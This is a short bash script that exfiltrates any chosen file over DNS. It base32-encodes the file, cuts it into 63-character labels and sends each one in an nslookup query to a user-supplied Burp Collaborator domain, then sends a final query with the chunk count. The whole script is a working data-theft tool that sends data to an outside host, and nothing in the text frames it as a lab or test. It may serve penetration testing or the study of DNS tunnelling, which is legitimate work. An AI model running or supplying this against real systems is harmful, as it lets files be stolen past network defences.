#!/bin/bash
dnsFlag="nspi"
amountFlag="amount"

verbose=

case "$1" in (-v|--v|--ve|--ver|--verb|--verbo|--verbos|--verbose)
    verbose=1
    shift ;;
esac

echo -n "Burp Collaborator address: "
read collabDomain

#Read in data to exfiltrate
echo -n "File to exfiltrate: "
read data
#Convert data to base32, space into 63-character chunks, delimit on spaces
#The base32 program might not be included, might want to write base32 encoding into here
data="$(cat $data | base32)"
data="$(echo $data | sed -r 's/(.{63})/\1 /g')"
data="$(echo $data| tr = ' ')"

#Set a counter to keep track of size
counter=0
for word in $data
do
    if [ "$verbose" = 1 ]; then
        echo "Tunneling chunk $counter: $dnsFlag.$word.$counter.$collabDomain"
    fi
    nslookup "$dnsFlag.$word.$counter.$collabDomain" > /dev/null
    ((counter+=1))
done

#Let the server know how many requests we sent
if [ "$verbose" = 1 ]; then
        echo "Tunneling amount chunk: $dnsFlag.$amountFlag.$counter.$collabDomain"
fi
nslookup "$dnsFlag.$amountFlag.$counter.$collabDomain" > /dev/null
